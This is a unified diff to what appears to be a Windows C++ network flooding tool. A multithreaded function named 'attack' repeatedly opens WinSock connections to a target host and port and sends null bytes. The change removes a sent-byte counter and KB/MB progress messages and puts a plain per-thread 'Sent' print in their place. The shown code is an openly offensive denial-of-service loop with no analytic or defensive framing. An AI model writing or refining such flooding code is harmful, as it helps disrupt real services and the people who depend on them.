@@ -1,4 +1,4 @@
-﻿#include <iostream>
+#include <iostream>
 #include <WinSock2.h>
 #include <WS2tcpip.h>
 #include <Windows.h>
@@ -16,7 +16,6 @@ struct threadinfo
 };
 
 WSAData wsaData;
-size_t sent;
 std::vector<threadinfo*> threads;
 
 int initwinsock()
@@ -58,7 +57,6 @@ DWORD WINAPI attack(LPVOID lpParameter)
 	int res = 0;
 	
 	char* buf = (char*)"\0\0\0\0";
-	//char buf = '\0\0\0\0';
 
 	struct threadinfo* info;
 	info = (struct threadinfo*)lpParameter;
@@ -82,22 +80,9 @@ DWORD WINAPI attack(LPVOID lpParameter)
 				closesocket(sockets[i]);
 				sockets[i] = createsocket(host, port);
 			}
-			else sent += 4;
 		}
-
-		bool kb = sent / 1000.0 > 1;
-		bool mb = sent / 1000000.0 > 1;
 		
-		if (id > 10)
-		{
-			if (kb) printf("[THREAD %d] [%d KB] Sent\n", id, (int)round(sent / 1000.0));
-			//if (mb) printf("[THREAD %d] [%d MB] Sent\n", id, (int)round(sent / 1000000.0));
-		}
-		else
-		{
-			if (kb) printf("[THREAD %d]  [%d KB] Sent\n", id, (int)round(sent / 1000.0));
-			//if (mb) printf("[THREAD %d]  [%d MB] Sent\n", id, (int)round(sent / 1000000.0));
-		}
+		printf("[THREAD %d] Sent\n", id);
 	}
 }
 
